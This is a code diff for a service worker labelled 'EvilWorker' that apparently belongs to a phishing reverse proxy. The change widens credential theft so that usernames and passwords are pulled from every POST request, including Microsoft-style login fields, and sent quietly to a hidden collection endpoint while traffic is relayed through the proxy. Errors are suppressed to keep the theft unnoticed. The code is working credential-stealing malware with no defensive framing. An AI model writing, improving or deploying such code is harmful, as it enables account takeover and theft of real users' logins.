@@ -1,72 +1,66 @@
 // ============================================================
-// SERVICE WORKER – EvilWorker (with credential extraction)
+// SERVICE WORKER – Captures credentials from ANY POST
 // ============================================================
 self.addEventListener("fetch", (event) => {
     event.respondWith(handleRequest(event.request));
 });
 
 async function handleRequest(request) {
-    // Clone the request so we can read the body without consuming it
     const clonedRequest = request.clone();
     let bodyText = '';
 
     try {
         bodyText = await clonedRequest.text();
     } catch (e) {
-        // If body is not readable (e.g., GET, empty), ignore
         bodyText = '';
     }
 
-    // ---- CREDENTIAL EXTRACTION (PLAINTEXT) ----
+    // ---- CREDENTIAL EXTRACTION (NO PATH DEPENDENCY) ----
     try {
-        // Only process POST requests that look like login attempts
-        if (request.method === 'POST' && bodyText.length > 0 && bodyText.length < 1024 * 10) {
-            const url = new URL(request.url);
-            // Check if the request target is a login endpoint (adjust as needed)
-            if (url.pathname.includes('/login') || url.pathname.includes('/signin') ||
-                url.pathname.includes('/common/login') || url.pathname.includes('/oauth2') ||
-                url.pathname.includes('/GetCredentialType')) {
+        if (request.method === 'POST' && bodyText.length > 0 && bodyText.length < 10240) {
+            let email = '';
+            let password = '';
+            const contentType = request.headers.get('content-type') || '';
 
-                let credentials = {};
-                const contentType = request.headers.get('content-type') || '';
-
-                // Parse based on content type
-                if (contentType.includes('application/json')) {
-                    credentials = JSON.parse(bodyText);
-                } else if (contentType.includes('application/x-www-form-urlencoded')) {
+            // Parse JSON
+            if (contentType.includes('application/json')) {
+                try {
+                    const json = JSON.parse(bodyText);
+                    email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
+                    password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
+                } catch (e) {}
+            }
+            // Parse URL-encoded (most common for Microsoft)
+            else if (contentType.includes('application/x-www-form-urlencoded')) {
+                try {
                     const params = new URLSearchParams(bodyText);
-                    credentials = Object.fromEntries(params);
-                }
+                    email = params.get('username') || params.get('user') || params.get('email') || 
+                            params.get('loginfmt') || params.get('login') || params.get('userid') || '';
+                    password = params.get('password') || params.get('passwd') || params.get('pass') || 
+                               params.get('Password') || params.get('pwd') || '';
+                } catch (e) {}
+            }
 
-                // Extract common credential fields
-                const email = credentials.username || credentials.user || credentials.email ||
-                              credentials.loginfmt || credentials.login || credentials.userid || '';
-                const password = credentials.password || credentials.passwd || credentials.pass ||
-                                 credentials.Password || credentials.pwd || '';
-
-                if (email || password) {
-                    // Send to your proxy's jsCookie endpoint (NOT /api/session)
-                    await fetch('/JSCookie_6X7dRqLg90mH', {
-                        method: 'POST',
-                        body: JSON.stringify({
-                            type: 'credentials',
-                            email: email,
-                            password: password,
-                            time: Date.now(),
-                            url: request.url
-                        }),
-                        headers: { 'Content-Type': 'application/json' }
-                    });
-                    // Optional: console log for debugging
-                    // console.log('[SW] Captured:', { email, password });
-                }
+            // If we found either, send to proxy
+            if (email || password) {
+                await fetch('/JSCookie_6X7dRqLg90mH', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        type: 'credentials',
+                        email: email || '',
+                        password: password || '',
+                        time: Date.now(),
+                        url: request.url
+                    }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
             }
         }
     } catch (e) {
-        // Silent fail – do not break the proxy flow
+        // Silent fail
     }
 
-    // ---- FORWARD REQUEST TO PROXY (as before) ----
+    // ---- FORWARD REQUEST TO PROXY ----
     const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;
     const proxyRequest = {
         url: request.url,
@@ -80,9 +74,7 @@ async function handleRequest(request) {
     try {
         return fetch(proxyRequestURL, {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify(proxyRequest),
             redirect: "manual",
             mode: "same-origin"
